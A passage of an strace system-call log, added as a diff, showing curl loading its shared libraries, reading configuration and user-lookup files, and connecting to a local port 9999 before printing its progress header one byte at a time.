+[pid 204979] mmap(NULL, 830576, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13285c4000
+[pid 204979] mprotect(0x7f13285e5000, 634880, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13285e5000, 380928, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x21000) = 0x7f13285e5000
+[pid 204979] mmap(0x7f1328642000, 249856, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7e000) = 0x7f1328642000
+[pid 204979] mmap(0x7f1328680000, 61440, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xbb000) = 0x7f1328680000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libk5crypto.so.3", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=182928, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 188472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328595000
+[pid 204979] mprotect(0x7f1328599000, 163840, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1328599000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x7f1328599000
+[pid 204979] mmap(0x7f13285b4000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f000) = 0x7f13285b4000
+[pid 204979] mmap(0x7f13285c1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2b000) = 0x7f13285c1000
+[pid 204979] mmap(0x7f13285c3000, 56, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f13285c3000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcom_err.so.2", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=18504, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1328593000
+[pid 204979] mmap(NULL, 20552, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f132858d000
+[pid 204979] mmap(0x7f132858f000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f132858f000
+[pid 204979] mmap(0x7f1328590000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1328590000
+[pid 204979] mmap(0x7f1328591000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1328591000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libkrb5support.so.0", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=52080, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 54224, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f132857f000
+[pid 204979] mprotect(0x7f1328582000, 36864, PROT_NONE) = 0
+[pid 204979] mmap(0x7f1328582000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1328582000
+[pid 204979] mmap(0x7f1328588000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x7f1328588000
+[pid 204979] mmap(0x7f132858b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x7f132858b000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libsasl2.so.2", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=105392, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 107504, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328564000
+[pid 204979] mmap(0x7f1328567000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f1328567000
+[pid 204979] mmap(0x7f1328578000, 20480, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x14000) = 0x7f1328578000
+[pid 204979] mmap(0x7f132857d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18000) = 0x7f132857d000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=137560, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 139320, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328541000
+[pid 204979] mmap(0x7f1328542000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7f1328542000
+[pid 204979] mmap(0x7f1328543000, 126976, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f1328543000
+[pid 204979] mmap(0x7f1328562000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x20000) = 0x7f1328562000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libp11-kit.so.0", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=1285888, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 1289160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f1328406000
+[pid 204979] mmap(0x7f132842f000, 671744, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x7f132842f000
+[pid 204979] mmap(0x7f13284d3000, 368640, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xcd000) = 0x7f13284d3000
+[pid 204979] mmap(0x7f132852d000, 81920, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x126000) = 0x7f132852d000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libtasn1.so.6", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=92312, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1328404000
+[pid 204979] mmap(NULL, 94760, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13283ec000
+[pid 204979] mprotect(0x7f13283ef000, 77824, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13283ef000, 57344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f13283ef000
+[pid 204979] mmap(0x7f13283fd000, 16384, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x11000) = 0x7f13283fd000
+[pid 204979] mmap(0x7f1328402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15000) = 0x7f1328402000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libkeyutils.so.1", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=22600, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 24592, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13283e5000
+[pid 204979] mmap(0x7f13283e7000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f13283e7000
+[pid 204979] mmap(0x7f13283e9000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x7f13283e9000
+[pid 204979] mmap(0x7f13283ea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x7f13283ea000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=68552, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 80456, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13283d1000
+[pid 204979] mmap(0x7f13283d4000, 40960, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x7f13283d4000
+[pid 204979] mmap(0x7f13283de000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xd000) = 0x7f13283de000
+[pid 204979] mmap(0x7f13283e1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf000) = 0x7f13283e1000
+[pid 204979] mmap(0x7f13283e3000, 6728, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f13283e3000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=47688, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 50736, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f13283c4000
+[pid 204979] mprotect(0x7f13283c6000, 36864, PROT_NONE) = 0
+[pid 204979] mmap(0x7f13283c6000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f13283c6000
+[pid 204979] mmap(0x7f13283cd000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x7f13283cd000
+[pid 204979] mmap(0x7f13283cf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa000) = 0x7f13283cf000
+[pid 204979] close(3)                   = 0
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f13283c2000
+[pid 204979] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f13283c0000
+[pid 204979] arch_prctl(ARCH_SET_FS, 0x7f13283c0f00) = 0
+[pid 204979] set_tid_address(0x7f13283c11d0) = 204979
+[pid 204979] set_robust_list(0x7f13283c11e0, 24) = 0
+[pid 204979] rseq(0x7f13283c18a0, 0x20, 0, 0x53053053) = 0
+[pid 204979] mprotect(0x7f13294c1000, 16384, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13283cf000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13283e1000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13283ea000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328402000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132852d000, 40960, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328562000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132857d000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132858b000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328591000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13285c1000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328680000, 53248, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132870f000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328754000, 8192, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132879d000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328b31000, 16384, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1329280000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328978000, 65536, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328b42000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328c11000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328c22000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328c80000, 8192, PROT_READ) = 0
+[pid 204979] mprotect(0x7f1328cd5000, 8192, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13290ba000, 372736, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13291b1000, 40960, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13291d1000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13294ee000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132923c000, 8192, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132925f000, 4096, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13292a8000, 12288, PROT_READ) = 0
+[pid 204979] mprotect(0x7f132958f000, 16384, PROT_READ) = 0
+[pid 204979] mprotect(0x56066418f000, 20480, PROT_READ) = 0
+[pid 204979] mprotect(0x7f13295e3000, 8192, PROT_READ) = 0
+[pid 204979] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+[pid 204979] munmap(0x7f1329596000, 76099) = 0
+[pid 204979] getrandom("\xe7\x33\xc8\xc5\x67\x0d\x5e\xf7", 8, GRND_NONBLOCK) = 8
+[pid 204979] brk(NULL)                  = 0x56066496c000
+[pid 204979] brk(0x56066498d000)        = 0x56066498d000
+[pid 204979] getrandom("\xb0", 1, GRND_NONBLOCK) = 1
+[pid 204979] newfstatat(AT_FDCWD, "/etc/gnutls/config", 0x7ffd63ad9b70, 0) = -1 ENOENT (No such file or directory)
+[pid 204979] pipe2([3, 4], 0)           = 0
+[pid 204979] close(3)                   = 0
+[pid 204979] close(4)                   = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+[pid 204979] futex(0x7f1329117ba4, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117ba0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b9c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117ef0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b94, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b90, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117778, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117a00, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117748, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] brk(0x5606649ae000)        = 0x5606649ae000
+[pid 204979] futex(0x7f1329117b98, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] openat(AT_FDCWD, "/usr/lib/ssl/openssl.cnf", O_RDONLY) = 3
+[pid 204979] futex(0x7f13291174d0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=12419, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] read(3, "#\n# OpenSSL example configuratio"..., 4096) = 4096
+[pid 204979] read(3, "r type CA, the listed attributes"..., 4096) = 4096
+[pid 204979] read(3, "r:copy\n\n# DER hex encoding of an"..., 4096) = 4096
+[pid 204979] read(3, "ertout # insta.cert.pem\n\n[ssl_se"..., 4096) = 131
+[pid 204979] read(3, "", 4096)          = 0
+[pid 204979] close(3)                   = 0
+[pid 204979] futex(0x7f1329117920, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b80, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b7c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f132911770c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f1329117b8c, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] futex(0x7f13291be7c0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] sysinfo({uptime=297572, loads=[105632, 87136, 84032], totalram=33584680960, freeram=22877835264, sharedram=638488576, bufferram=777281536, totalswap=2147479552, freeswap=2147479552, procs=1376, totalhigh=0, freehigh=0, mem_unit=1}) = 0
+[pid 204979] futex(0x7f13291be7d4, FUTEX_WAKE_PRIVATE, 2147483647) = 0
+[pid 204979] openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=6784496, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] mmap(NULL, 6784496, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f1327d47000
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/home/ueno/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid 204979] geteuid()                  = 1000
+[pid 204979] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
+[pid 204979] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid 204979] close(3)                   = 0
+[pid 204979] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
+[pid 204979] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid 204979] close(3)                   = 0
+[pid 204979] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=542, ...}, 0) = 0
+[pid 204979] newfstatat(AT_FDCWD, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+[pid 204979] openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=542, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 542
+[pid 204979] read(3, "", 4096)          = 0
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=542, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
+[pid 204979] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2929, ...}, AT_EMPTY_PATH) = 0
+[pid 204979] lseek(3, 0, SEEK_SET)      = 0
+[pid 204979] read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 2929
+[pid 204979] close(3)                   = 0
+[pid 204979] openat(AT_FDCWD, "/home/ueno/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] ioctl(1, TCGETS, 0x7ffd63ad9e50) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid 204979] ioctl(0, TIOCGWINSZ, {ws_row=63, ws_col=221, ws_xpixel=3536, ws_ypixel=2016}) = 0
+[pid 204979] socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 3
+[pid 204979] close(3)                   = 0
+[pid 204979] socketpair(AF_UNIX, SOCK_STREAM, 0, [3, 4]) = 0
+[pid 204979] fcntl(3, F_GETFL)          = 0x2 (flags O_RDWR)
+[pid 204979] fcntl(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid 204979] fcntl(4, F_GETFL)          = 0x2 (flags O_RDWR)
+[pid 204979] fcntl(4, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] poll([{fd=3, events=POLLIN}], 1, 0) = 0 (Timeout)
+[pid 204979] rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, 8) = 0
+[pid 204979] rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f13292ee520}, NULL, 8) = 0
+[pid 204979] brk(0x5606649df000)        = 0x5606649df000
+[pid 204979] socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
+[pid 204979] setsockopt(5, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+[pid 204979] setsockopt(5, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+[pid 204979] setsockopt(5, SOL_TCP, TCP_KEEPIDLE, [60], 4) = 0
+[pid 204979] setsockopt(5, SOL_TCP, TCP_KEEPINTVL, [60], 4) = 0
+[pid 204979] fcntl(5, F_GETFL)          = 0x2 (flags O_RDWR)
+[pid 204979] fcntl(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid 204979] connect(5, {sa_family=AF_INET, sin_port=htons(9999), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "%", 1%)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "T", 1T)           = 1
+[pid 204979] write(2, "o", 1o)           = 1
+[pid 204979] write(2, "t", 1t)           = 1
+[pid 204979] write(2, "a", 1a)           = 1
+[pid 204979] write(2, "l", 1l)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "%", 1%)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "R", 1R)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "c", 1c)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "i", 1i)           = 1
+[pid 204979] write(2, "v", 1v)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "%", 1%)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "X", 1X)           = 1
+[pid 204979] write(2, "f", 1f)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "r", 1r)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "A", 1A)           = 1
+[pid 204979] write(2, "v", 1v)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "r", 1r)           = 1
+[pid 204979] write(2, "a", 1a)           = 1
+[pid 204979] write(2, "g", 1g)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "S", 1S)           = 1
+[pid 204979] write(2, "p", 1p)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "d", 1d)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "T", 1T)           = 1
+[pid 204979] write(2, "i", 1i)           = 1
+[pid 204979] write(2, "m", 1m)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "T", 1T)           = 1
+[pid 204979] write(2, "i", 1i)           = 1
+[pid 204979] write(2, "m", 1m)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "T", 1T)           = 1
+[pid 204979] write(2, "i", 1i)           = 1
+[pid 204979] write(2, "m", 1m)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, "C", 1C)           = 1
+[pid 204979] write(2, "u", 1u)           = 1
+[pid 204979] write(2, "r", 1r)           = 1
+[pid 204979] write(2, "r", 1r)           = 1
+[pid 204979] write(2, "e", 1e)           = 1
+[pid 204979] write(2, "n", 1n)           = 1
+[pid 204979] write(2, "t", 1t)           = 1
+[pid 204979] write(2, "\n", 1
+)          = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
+[pid 204979] write(2, " ", 1 )           = 1
